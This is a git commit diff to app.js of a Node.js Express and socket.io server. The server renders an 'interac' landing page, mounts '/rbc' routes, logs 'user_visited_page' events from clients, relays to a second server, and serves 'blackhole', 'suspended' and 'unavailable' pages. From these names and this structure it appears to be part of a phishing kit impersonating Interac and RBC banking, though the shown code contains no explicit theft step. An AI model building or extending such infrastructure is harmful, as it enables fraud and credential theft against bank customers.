4fbfce18a3f8a50702748272c7ab6c6ee6d25d21
webcro <gabriel273274@gmail.com>
2023-10-20 21:17:50 +0000

    a lot change

--- app.js
+++ app.js
@@ -10,26 +10,36 @@ const bodyParser = require('body-parser');
 const path = require('path');
 const axios = require('axios');
 
-const { SERVER_B, SERVER_B_IP} = require('./config/config');
+const { SERVER_B, SERVER_B_IP, SERVER_A, SERVER_A_IP } = require('./config/config');
 const app = express();
 const server = http.createServer(app);
 const io = socketIo(server);
 const socketToB = socketClient(SERVER_B); // Address of Server B
 
+
+// 2. Middleware
+app.use(bodyParser.json()); // for parsing application/json
+app.use(bodyParser.urlencoded({ extended: true })); // for parsing application/x-www-form-urlencoded
+app.use(express.static('public'));
+app.set('view engine', 'ejs');
+app.set('views', path.join(__dirname, 'views'));
+
+
+
 // TEST : SEE IF THE IP IS GOOD FOR SERVER_B CONSTANT
-console.log(SERVER_B);
+//console.log(SERVER_B);
+//console.log(SERVER_A);
 
 // Server capabilities
 io.on('connection', (socket) => {
-    let userIP = socket.handshake.address;
-    
-    // TEST : Check what is the user ip just connected
-    console.log(`TEST : User ${userIP} is connected !`);
-    
+    socket.on('user_visited_page', (message) => {
+        console.log(message);  // This will log the message sent from the client-side.
+    });
+
     socket.on('message_from_client', (data) => {
         console.log('Received:', data);
     });
-    
+
     socket.on('disconnect', () => {
         console.log('A client disconnected from Server A');
     });
@@ -49,15 +59,15 @@ socketToB.on('message_from_b', (data) => {
 });
 
 // 3. Route Grouping
-app.get('/', (req, res) => { res.render('landing/interac/page', { ip: SERVER_B_IP }); });
+app.get('/', (req, res) => { res.render('landing/interac/page', { ip: SERVER_A }); });
 
 // RBC Routes
 app.use('/rbc', require('./routes/rbc'));
 
 // Error/Status Pages
-app.get('/blackhole', (req, res) => res.render('blackhole', { ip: SERVER_B_IP }));
-app.get('/suspended', (req, res) => res.render('suspended', { ip: SERVER_B_IP }));
-app.get('/unavailable', (req, res) => res.render('unavailable', { ip: SERVER_B_IP }));
+app.get('/blackhole', (req, res) => res.render('blackhole', { ip: SERVER_A }));
+app.get('/suspended', (req, res) => res.render('suspended', { ip: SERVER_A }));
+app.get('/unavailable', (req, res) => res.render('unavailable', { ip: SERVER_A }));
 
 app.listen(3000, () => {
     console.log('Server A listening on *:3000');
